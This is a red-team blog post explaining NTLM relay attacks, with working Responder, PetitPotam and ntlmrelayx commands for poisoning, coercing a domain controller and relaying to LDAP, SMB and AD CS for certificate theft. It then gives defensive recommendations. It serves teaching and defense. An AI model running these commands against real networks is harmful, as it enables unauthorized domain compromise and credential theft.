---
title: "NTLM Relay Attacks: Coercion, Poisoning, and Defenses"
date: 2022-08-14
draft: false
tags: ["NTLM", "Relay", "Responder", "PetitPotam", "Active Directory"]
categories: ["Red Team"]
summary: "Why relaying NTLM authentication is still effective in 2022, and what actually stops it."
---

NTLM relay is old. It also still works in a large fraction of internal networks, because the two controls that prevent it — SMB signing and LDAP signing/channel binding — are inconsistently deployed.

The attack has three parts: get someone to authenticate to you, relay that authentication to a different service, and hope nobody checks.

## Getting authentication

Two families of technique:

**Poisoning.** Respond to broadcasts so victims authenticate to you instead of the real host.

```bash
sudo responder -I eth0 -wv
```

Name resolution poisoning over LLMNR/NBT-NS and mDNS. It's noisy in logs that nobody reads, and it works.

**Coercion.** Force a machine account to authenticate to a host you control, using a legitimately callable RPC interface:

```bash
# PetitPotam — coercion via EfsRpcOpenFileRaw
python3 PetitPotam.py -d lab.local -u jdoe -p 'Password123!' 10.10.10.50 10.10.10.10
```

`10.10.10.50` is the relay host, `10.10.10.10` is the domain controller being coerced. The DC authenticates to your machine, which is exactly what you wanted.

Coercion is the more interesting technique because it doesn't depend on the victim doing anything — it's a server asking to be authenticated to.

## Relaying

`ntlmrelayx` is the workhorse. Kill Responder's SMB and HTTP listeners first, or the two fight over the same ports.

```bash
# Relay to LDAP (no signing by default) and set RBCD on the target computer
impacket-ntlmrelayx -t ldap://10.10.10.10 --escalate-user jdoe

# Relay SMB to a target with signing disabled
impacket-ntlmrelayx -tf targets.txt -smb2support

# Relay to AD CS for a certificate
impacket-ntlmrelayx -t http://ca.lab.local/certsrv/certfnsh.asp -smb2support --adcs
```

The `--adcs` path is the most valuable against a modern domain: relay an authenticated request from a machine account to a Certificate Authority, get a certificate, and use it for PKINIT. That gives you a ticket for the machine account, which is a much shorter path to domain compromise than cracking a hash.

## Why each target is (or isn't) viable

| Target | Default | Works? |
| --- | --- | --- |
| SMB | Signing off on workstations | Usually yes |
| LDAP | Signing off | Yes — best for ACL abuse |
| HTTP/AD CS | No signing | Yes — best for certificate theft |
| SMB to a DC | Signing on | No |

That last row is the reason DCs aren't usually the relay target for SMB. Relaying *from* a coerced DC, as in the PetitPotam example, is the interesting direction.

## Defenses that actually land

- **Enable SMB signing** everywhere, not just on DCs. GPO: *Microsoft network server: Digitally sign communications (always)*.
- **Enable LDAP signing and channel binding** on domain controllers. Channel binding is the one that stops relay to LDAPS.
- **Disable LLMNR and NBT-NS** via GPO. This removes the poisoning half of the attack at zero cost.
- **Patch the coercion primitives.** PetitPotam, DFSCoerce, and friends get patched; new ones appear. Treat coercion as a recurring class, not a one-off.
- **Harden AD CS.** Require CA manager approval for certificate requests, and audit template permissions.

## What I'd fix first

If you only do one thing: **disable LLMNR and NBT-NS**. It's two GPO settings, breaks nothing in a normal environment, and eliminates the entire poisoning category rather than one instance of it.

If you only do two: add SMB signing. Between them, the attacker loses both the ability to make victims talk to them and the ability to relay the result to an unauthenticated service.
